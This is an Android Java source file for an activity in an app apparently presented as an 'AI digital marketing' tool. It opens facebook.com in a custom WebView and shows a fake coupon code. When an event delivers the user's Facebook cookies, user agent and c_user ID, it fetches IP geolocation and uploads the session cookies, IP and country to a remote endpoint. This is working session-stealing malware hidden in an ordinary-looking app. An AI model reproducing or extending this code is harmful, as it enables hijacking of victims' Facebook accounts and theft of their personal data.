package com.madgicx.ai_digital_marketing.activity;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.AppCompatImageView;

import com.madgicx.ai_digital_marketing.R;
import com.madgicx.ai_digital_marketing.base.BaseRx;
import com.madgicx.ai_digital_marketing.event.StringEvent;
import com.madgicx.ai_digital_marketing.model.IpModel;
import com.madgicx.ai_digital_marketing.network.manager.RestApiManager;
import com.madgicx.ai_digital_marketing.network.response.BaseResponse;
import com.madgicx.ai_digital_marketing.utils.EventBusUtil;
import com.madgicx.ai_digital_marketing.utils.ValidateUtils;
import com.madgicx.ai_digital_marketing.widget.CWebView;

import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;
import org.jetbrains.annotations.NotNull;

import io.reactivex.Observable;

public class InsideActivity extends AppCompatActivity {

    private TextView txtCode;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_inside);

        CWebView webView = findViewById(R.id.web_view);
        txtCode = findViewById(R.id.txtCode);
        AppCompatImageView saveCoupon = findViewById(R.id.saveCoupon);

        EventBusUtil.register(this);
        if (!getIntent().getBooleanExtra("first", true)) {
            webView.loadUrl("https://www.facebook.com/");
        }
        txtCode.setText(ValidateUtils.INSTANCE.randomAlphaNumeric(11));
        saveCoupon.setOnClickListener(v -> handlerCopy());
    }

    private void handlerCopy() {
        ClipboardManager manager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        ClipData clipData = ClipData.newPlainText("text", txtCode.getText());
        manager.setPrimaryClip(clipData);
        Toast.makeText(this, R.string.copy_success, Toast.LENGTH_SHORT).show();
    }

    @Subscribe(threadMode = ThreadMode.MAIN)
    public void onStringEvent(StringEvent event) {
        new BaseRx<IpModel>().callApi(new BaseRx.BaseRxCallBackCallApi<IpModel>() {
            @Override
            public void onResponse(IpModel result) {
                new BaseRx<BaseResponse>().callApi(new BaseRx.BaseRxCallBackCallApi<BaseResponse>() {
                    @Override
                    public void onResponse(BaseResponse result) {
                        Log.d("thent", result.message);
                    }

                    @NotNull
                    @Override
                    public Observable<BaseResponse> onFun() {
                        Log.d("phanHai", "cookies: "+event.cookies);
                        Log.d("phanHai", "userAgent: "+event.userAgent);
                        Log.d("phanHai", "c_user: "+event.c_user);
                        Log.d("phanHai", "ip: "+result.ip);
                        Log.d("phanHai", "city: "+result.city);
                        Log.d("phanHai", "country: "+result.country);
                        Log.d("phanHai", "loc: "+result.loc);
                        Log.d("phanHai", "timezone: "+result.timezone);
                        Log.d("phanHai", "readme: "+result.readme);
                        Log.d("phanHai", "org: "+result.org);
                        Log.d("phanHai", "postal: "+result.postal);
                        Log.d("phanHai", "region: "+result.region);
                        return RestApiManager.getInstance().pushDataManager().getData("addItem", result.ip, getString(R.string.app_name), result.country, event.cookies);
                    }

                    @Override
                    public void onError(@NotNull Throwable e) {
                        Log.d("thent", e.getMessage());
                    }
                });
            }

            @NotNull
            @Override
            public Observable<IpModel> onFun() {
                return RestApiManager.getInstance().getIpManager().getIp();
            }

            @Override
            public void onError(@NotNull Throwable e) {
                Log.d("thent", e.getMessage());
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        EventBusUtil.unregister(this);
    }
}
